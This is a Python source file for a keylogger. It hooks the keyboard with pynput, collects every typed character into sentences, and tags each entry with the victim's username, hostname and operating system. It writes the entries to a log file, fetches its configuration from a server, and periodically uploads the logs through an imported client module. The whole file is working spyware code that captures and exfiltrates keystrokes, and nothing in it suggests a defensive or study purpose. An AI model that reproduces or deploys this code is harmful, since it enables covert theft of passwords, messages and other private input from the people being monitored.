# -*- coding: utf-8 -*-
"""
Keylogger with UTF-8 Encoding and Special Key Support
"""

import os
import time
import socket
import platform
import threading
from pynput import keyboard
from client import send_logs, get_log_file, get_config_from_server, get_send_interval

log_file = get_log_file()
get_config_from_server()
SEND_INTERVAL = get_send_interval()

current_sentence = ""
listener_active = True

def get_device_id():
    """Generate unique device identifier: username@hostname_OS"""
    hostname = socket.gethostname()
    username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
    system = platform.system()
    return f"{username}@{hostname}_{system}"

device_id = get_device_id()

def write_log(message):
    """Write log entry in JSON format: [device_id, timestamp, message]"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    # Escape special JSON characters
    message_escaped = message.replace('\\', '\\\\').replace('"', '\\"')
    log_entry = f'["{device_id}", "{timestamp}", "{message_escaped}"]\n'
    
    try:
        with open(log_file, 'a', encoding='utf-8', errors='replace') as f:
            f.write(log_entry)
    except:
        pass

write_log("=== Session Started ===")

def auto_send_logs():
    """Periodically send logs to server at configured interval"""
    global listener_active
    
    while listener_active:
        time.sleep(SEND_INTERVAL)
        
        if listener_active and os.path.exists(log_file):
            success = send_logs()
            if success:
                write_log("=== New Session ===")

def on_press(key):
    """Handle key press events"""
    global current_sentence
    
    try:
        # Space key
        if key == keyboard.Key.space:
            current_sentence += " "
            return
        
        # Enter key - log current sentence
        if key == keyboard.Key.enter:
            current_sentence += "[ENTER]"
            if current_sentence.strip():
                write_log(current_sentence)
                current_sentence = ""
            return
        
        # Regular characters (letters, numbers, symbols)
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            char_code = ord(char)
            # Ignore control characters except tab
            if char_code < 32 and char_code != 9:
                return
            current_sentence += char
            return
    except:
        pass

def on_release(key):
    """Handle key release - ESC to stop"""
    global listener_active, current_sentence
    
    if key == keyboard.Key.esc:
        if current_sentence.strip():
            write_log(current_sentence)
        
        write_log("=== Session Ended (Manual Stop) ===")
        listener_active = False
        send_logs()
        return False

# Start auto-send thread
timer_thread = threading.Thread(target=auto_send_logs, daemon=True)
timer_thread.start()

# Start keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    listener_active = False
    write_log("=== Session Ended (Interrupted) ===")
    send_logs()